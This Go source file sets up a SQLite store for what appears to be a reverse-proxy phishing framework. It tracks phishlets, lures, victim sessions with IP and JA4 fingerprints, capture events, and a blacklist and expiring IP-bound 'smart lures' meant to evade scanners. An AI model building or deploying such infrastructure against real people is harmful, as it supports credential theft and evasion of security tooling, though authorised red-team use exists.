// Package sqlite — метаданные (specs/db-v1.md). Pure-Go, без CGO.
// Креды сюда НЕ пишем, только факты захватов.
package sqlite

import (
	"database/sql"
	"fmt"
	"strings"

	_ "modernc.org/sqlite"
)

const schema = `
CREATE TABLE IF NOT EXISTS lures (id TEXT PRIMARY KEY, phishlet_id TEXT NOT NULL, path TEXT NOT NULL UNIQUE, created_at INTEGER NOT NULL);
CREATE TABLE IF NOT EXISTS sessions (id TEXT PRIMARY KEY, phishlet_id TEXT NOT NULL, ip TEXT NOT NULL, ja4 TEXT DEFAULT '', bot_score INTEGER DEFAULT 0, created_at INTEGER NOT NULL);
CREATE TABLE IF NOT EXISTS captures (id TEXT PRIMARY KEY, session_id TEXT NOT NULL, kind TEXT NOT NULL, created_at INTEGER NOT NULL);
CREATE TABLE IF NOT EXISTS blacklist (ip_or_ja4 TEXT PRIMARY KEY, reason TEXT NOT NULL);
CREATE TABLE IF NOT EXISTS smart_lures (path TEXT PRIMARY KEY, phishlet_id TEXT NOT NULL, expires_at INTEGER DEFAULT 0, max_uses INTEGER DEFAULT 0, uses INTEGER DEFAULT 0, bound_ip TEXT DEFAULT '', require_challenge INTEGER DEFAULT 0);
`

type DB struct{ sql *sql.DB }

func Open(path string) (*DB, error) {
	d, err := sql.Open("sqlite", path)
	if err != nil {
		return nil, err
	}
	if _, err := d.Exec(schema); err != nil {
		d.Close()
		return nil, fmt.Errorf("migrate: %w", err)
	}
	// Миграция старых баз: captures.node (идемпотентно).
	if _, err := d.Exec(`ALTER TABLE captures ADD COLUMN node TEXT DEFAULT ''`); err != nil {
		if !isDupColumn(err) {
			d.Close()
			return nil, fmt.Errorf("migrate node: %w", err)
		}
	}
	return &DB{sql: d}, nil
}

func isDupColumn(err error) bool {
	s := strings.ToLower(err.Error())
	return strings.Contains(s, "duplicate column")
}

func (d *DB) Close() error { return d.sql.Close() }

func (d *DB) Ping() error { return d.sql.Ping() }
